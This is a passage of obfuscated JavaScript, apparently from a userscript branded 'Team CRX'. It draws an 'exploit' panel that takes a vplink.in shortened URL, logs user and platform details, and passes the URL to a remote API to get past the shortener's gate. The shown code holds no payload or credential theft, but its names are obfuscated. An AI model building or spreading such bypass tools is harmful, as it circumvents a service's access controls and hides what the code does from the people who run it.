    } = _0x154f83("\n      <button id=\"exploit-music-btn\" class=\"nb-music-btn\">♪</button>\n      <div class=\"nb-exploit-header\">\n        <span class=\"nb-live-dot\"></span>\n        <span style=\"width:7px;height:7px;background:#ff00ff;border-radius:50%;box-shadow:0 0 6px #ff00ff;flex-shrink:0;\"></span>\n        <span style=\"width:7px;height:7px;background:var(--electric-glow-1);border-radius:50%;box-shadow:0 0 6px var(--electric-glow-1);flex-shrink:0;\"></span>\n        <span class=\"nb-exploit-title\">" + _0x3c10b7 + "://" + _0x50c9a2.name.replace(/\s+/g, "_").toUpperCase() + "</span>\n        <span id=\"nb-live-status\" style=\"color:var(--info-color);font-size:8px;margin-left:auto;animation:nb-pulse 1.5s infinite;flex-shrink:0;font-weight:700;\">● LIVE</span>\n      </div>\n      \n      <div style=\"margin-bottom:8px;\">\n        <input id=\"vplink-url-input\" class=\"nb-emboss-input\" type=\"text\" autocomplete=\"off\" placeholder=\"PASTE VPLINK.IN URL\">\n      </div>\n      <p id=\"vplink-url-error\" class=\"nb-error-text\">⛔ INVALID VPLINK.IN URL</p>\n      \n      <button id=\"vplink-submit-btn\" class=\"nb-emboss-btn\" disabled>⬡ VERIFY & EXTRACT</button>\n      \n      <div id=\"log-output\" class=\"nb-log-area\"></div>\n      \n      <div class=\"nb-progress-label\">\n        <span>PROGRESS</span>\n        <span id=\"nb-progress-pct\" style=\"font-weight:700;\">0%</span>\n      </div>\n      <div class=\"nb-progress-bar-bg\">\n        <div id=\"nb-progress-exploit\" class=\"nb-progress-bar-fill\"></div>\n      </div>\n      \n      <div class=\"nb-footer\"><a href=\"https://crxx.netlify.app\" target=\"_blank\">© Team CRX</a> | " + _0x1db9e0 + " | 📳 Shake to change track 🎵</div>\n    ");
    _0x5a9c21.appendChild(_0x133887);
    document.body.appendChild(_0x5a9c21);
    _0x2a5e40("exploit-music-btn");
    const _0x7cae2a = document.getElementById("vplink-url-input");
    const _0x5d8b99 = document.getElementById("vplink-submit-btn");
    const _0x15853d = document.getElementById("vplink-url-error");
    _0x7cae2a.addEventListener("focus", () => _0x2fbf89(_0x343b6d, _0x226728));
    _0x7cae2a.addEventListener("blur", () => _0x273f12(_0x343b6d, _0x226728));
    _0x7cae2a.addEventListener("input", function () {
      const _0x161d0c = _0x7cae2a.value.trim();
      _0x15853d.style.display = "none";
      _0x7cae2a.classList.remove("error", "success");
      if (_0x161d0c.length > 0) {
        if (_0x161d0c.toLowerCase().includes("vplink.in")) {
          _0x5d8b99.disabled = false;
          _0x7cae2a.classList.add("success");
        } else {
          _0x5d8b99.disabled = true;
        }
      } else {
        _0x5d8b99.disabled = true;
      }
    });
    _0x5d8b99.addEventListener("click", async function () {
      if (_0x5d8b99.disabled) {
        return;
      }
      const _0xe9b94f = _0x7cae2a.value.trim();
      if (!_0xe9b94f.toLowerCase().includes("vplink.in")) {
        _0x15853d.style.display = "block";
        _0x7cae2a.classList.add("error");
        setTimeout(() => _0x7cae2a.classList.remove("error"), 400);
        return;
      }
      let _0x30a0ee = _0xe9b94f;
      if (!_0x30a0ee.startsWith("http://") && !_0x30a0ee.startsWith("https://")) {
        _0x30a0ee = "https://" + _0x30a0ee;
      }
      _0x5d8b99.disabled = true;
      _0x7cae2a.disabled = true;
      _0x273f12(_0x343b6d, _0x226728);
      _0x4a2c1e();
      _0x455c4e("⚡", _0x1db9e0 + " — " + _0x426943, "#ff00ff", "log-highlight");
      _0x455c4e("◆", "PLATFORM: " + navigator.platform.toUpperCase(), "#718096");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("⚙", "SYSTEM CONFIGURATION", "#ffa500", "log-highlight");
      _0x455c4e("●", "STATUS: ACTIVE", "#2ecc71", "log-success");
      _0x455c4e("●", "MODULE: UNIVERSAL VPLINK EXTRACTOR", "#ff00ff");
      _0x455c4e("●", "API ENDPOINT: " + _0x3edb97.apiBaseUrl, "#4a5568");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("👤", "USER PROFILE", "#ffa500", "log-highlight");
      _0x455c4e("●", "NAME: " + _0x50c9a2.name.toUpperCase(), "#4a5568");
      _0x455c4e("●", "USER ID: " + _0x50c9a2.id, "#4a5568");
      _0x455c4e("", "━".repeat(35), "#cbd5e1", "log-separator");
      _0x455c4e("🔍", "VERIFYING VPLINK.IN URL...", "#ff00ff", "log-highlight");
      _0x455c4e("🔗", "INPUT: " + (_0x30a0ee.length > 50 ? _0x30a0ee.substring(0, 50) + "..." : _0x30a0ee), "#4a5568");
      _0x10c2be = Date.now();
      _0xd07885 = _0x3edb97.minProgressTime;
      _0x19023b();
      _0x247afa(_0x30a0ee);
    });
    _0x7cae2a.addEventListener("keydown", _0x545c24 => {
      if (_0x545c24.key === "Enter") {
        _0x545c24.preventDefault();
        _0x5d8b99.click();
      }
    });
  }
  (async function () {
    _0x22c702.log("BOOT", "═══════ " + _0x1db9e0 + " BOOTING ═══════");
    _0x22c702.log("BOOT", "USER_ID: " + _0x44a1aa);
    _0x22c702.log("BOOT", "directTarget: " + (_0x21c643 ? _0x21c643.name : "none"));
    await _0x5159fa();
    _0x40c4a5 = !_0x52194d();
    _0x22c702.log("BOOT", "Network check: musicAutoPlay=" + _0x40c4a5 + ", musicUserEnabled=" + _0x2e5a49);
    const _0x14df88 = await _0xdff77e();
    if (!_0x14df88) {
      _0x22c702.log("BOOT", "⚠ Failed to load user data, using defaults");
    } else {
      _0x22c702.log("BOOT", "✅ User data loaded successfully");
    }
    _0x22c702.log("BOOT", "User: " + _0x50c9a2.name + " (ID:" + _0x50c9a2.id + ")");
    if (_0x1d582a()) {
      _0x221b88();
      return;
    }
    if (_0x4c9a1e()) {
      _0x1d0203();
      return;
    }
    if (_0x3edb97.status === 0) {
      _0x115f79();
      return;
    }
    if (_0x3edb97.status === 2) {
      _0x5cf655();
      return;
    }
    await _0x1039cc();
    _0x22c702.log("BOOT", "═══════ BOOT COMPLETE ═══════");
    _0x6df88b();
  })();
})();